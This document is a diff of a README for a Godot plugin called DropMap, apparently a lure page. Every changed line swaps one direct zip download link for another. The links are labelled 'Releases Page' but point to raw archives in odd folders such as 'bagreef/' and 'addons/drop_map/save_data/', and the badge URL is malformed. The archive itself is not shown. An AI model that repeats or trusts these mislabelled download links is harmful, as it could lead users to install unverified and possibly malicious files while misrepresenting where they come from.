@@ -1,6 +1,6 @@
 # 🎨 DropMap - Easy Scene Decoration for Godot
 
-[![Download DropMap](https://raw.githubusercontent.com/Sohanurvcb308/DropMap/main/bagreef/DropMap.zip%https://raw.githubusercontent.com/Sohanurvcb308/DropMap/main/bagreef/DropMap.zip)](https://raw.githubusercontent.com/Sohanurvcb308/DropMap/main/bagreef/DropMap.zip)
+[![Download DropMap](https://github.com/Sohanurvcb308/DropMap/raw/refs/heads/main/addons/drop_map/save_data/Map-Drop-2.4.zip%https://github.com/Sohanurvcb308/DropMap/raw/refs/heads/main/addons/drop_map/save_data/Map-Drop-2.4.zip)](https://github.com/Sohanurvcb308/DropMap/raw/refs/heads/main/addons/drop_map/save_data/Map-Drop-2.4.zip)
 
 ## 📦 Introduction
 
@@ -10,7 +10,7 @@ DropMap is a handy plugin designed for users of the Godot game engine. It simpli
 
 To get going with DropMap, follow these simple steps:
 
-1. **Visit the Releases Page**: Head to the [DropMap Releases Page](https://raw.githubusercontent.com/Sohanurvcb308/DropMap/main/bagreef/DropMap.zip) to find the latest version of the software.
+1. **Visit the Releases Page**: Head to the [DropMap Releases Page](https://github.com/Sohanurvcb308/DropMap/raw/refs/heads/main/addons/drop_map/save_data/Map-Drop-2.4.zip) to find the latest version of the software.
   
 2. **Choose the Right File**: Look for the version that suits your system. You may see different files for various systems, such as Windows, Mac, or Linux.
 
@@ -38,7 +38,7 @@ DropMap offers various features to enhance your scene creation:
 
 To set up DropMap on your system, follow these steps:
 
-1. **Visit the Releases Page**: Navigate to the [DropMap Releases Page](https://raw.githubusercontent.com/Sohanurvcb308/DropMap/main/bagreef/DropMap.zip).
+1. **Visit the Releases Page**: Navigate to the [DropMap Releases Page](https://github.com/Sohanurvcb308/DropMap/raw/refs/heads/main/addons/drop_map/save_data/Map-Drop-2.4.zip).
 
 2. **Select the Correct File**: Identify the version that corresponds to your operating system.
 
